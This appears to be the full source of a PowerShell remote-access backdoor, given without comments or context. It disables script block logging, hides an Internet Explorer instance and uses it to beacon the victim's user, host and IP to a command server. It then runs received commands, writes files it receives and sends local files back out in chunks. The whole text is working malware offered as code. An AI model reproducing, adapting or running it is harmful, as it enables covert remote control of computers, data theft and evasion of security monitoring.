iex('$p=[ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static");if($p){$c=$p.GetValue($null);if($c["ScriptBlockLogging"]){$c["ScriptBlockLogging"]["EnableScriptBlockLogging"]=0;$c["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"]=0;}$v=[System.Collections.Generic.Dictionary[string,System.Object]]::new();$v.Add("EnableScriptBlockLogging",0);$v.Add("EnableScriptBlockInvocationLogging",0);$c["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"]=$v;}');
$SRV=@("");
$x=[system.text.encoding]::UTF8;
$n=50000;
$d=10;
function _n{
$global:e=new-object -com internetexplorer.application;
$global:e.visible=$false;
$global:e.silent=$true;
}
function _c{
$global:e.quit();
[system.runtime.interopservices.marshal]::releasecomobject($global:e)|out-null;
[system.gc]::collect();
[system.gc]::waitforpendingfinalizers();
}
function _g{
param($s,$d);
_n ;
$global:e.navigate2($s+'?'+$d,14,0,$null,$null);
while($global:e.busy -or ($global:e.readystate -ne 4)){sleep -seconds 1}
$r=$global:e.document.lastchild.innertext;
_c ;
return $r;
}
function _p{
param($s,$d);
_n ;
$global:e.navigate2($s,14,0,$x.GetBytes($d),'Content-Type: application/x-www-form-urlencoded');
while($global:e.busy -or ($global:e.readystate -ne 4)){sleep -seconds 1}
_c ;
}
function _x{
param($private:x);
try{return ((iex $private:x 2>&1|out-string)+' ')}catch{return [string]$_}
}
while(1){
  try{
    $s_i=0;
    $t0=[system.security.principal.windowsidentity]::GetCurrent().Name;
    $t1=[system.net.dns]::GetHostName();
    $t2=get-wmiobject Win32_NetworkAdapterConfiguration|where {$_.Ipaddress.length -gt 1};
    $u=_g $SRV[$s_i] ('i='+[system.net.webutility]::UrlEncode([system.convert]::ToBase64String($x.GetBytes($t0+'|'+$t1+'|'+$t2.ipaddress[0]))));
    while(1){
      $b=new-object Collections.ArrayList;
      $s_i=($s_i+1)%$SRV.count;
      while(1){
        $c=_g $SRV[$s_i] "u=$u";
        if($c -ne $null){break}
        sleep -seconds (Get-Random -InputObject @(1..$d));
      }
      while(1){
        $b.add($c)|out-null;
        $c=_g $SRV[$s_i] "u=$u";
        if($c -eq $null){break}
      }
      try{
        if($b[0][0] -eq '0'){
          $r=[system.convert]::ToBase64String($x.GetBytes((_x($x.GetString([system.convert]::FromBase64String(($b -join '').split('|')[1]))))));
        }elseif($b[0][0] -eq '1'){
          $r='ok';
          [system.io.file]::WriteAllBytes($x.GetString([system.convert]::FromBase64String($b[0].split('|')[1])),[system.convert]::FromBase64String($b[1..($b.count-1)] -join ''));
        }elseif($b[0][0] -eq '2'){
          $r=[system.convert]::ToBase64String([system.io.file]::ReadAllBytes($x.GetString([system.convert]::FromBase64String($b[0].split('|')[1]))));
        }
      }catch{
        $r=[system.convert]::ToBase64String($x.GetBytes([system.string]$_));
      }
      $i=0;
      while ($i -le ($r.length - $n)) {
        $c=$r[$i..($i + $n - 1)] -join '';
        _p $SRV[$s_i] ("u=$u&d="+[system.net.webutility]::UrlEncode($c));
        $i+=$n;
      }
      $c=$r[$i..($r.length+$n-1)] -join '';
      _p $SRV[$s_i] ("u=$u&d="+[system.net.webutility]::UrlEncode($c));
      _p $SRV[$s_i] ("u=$u&d=");
    }
  }
  catch {
    write-host $_;
    if($global:e -ne $null){_c ;}
  }
}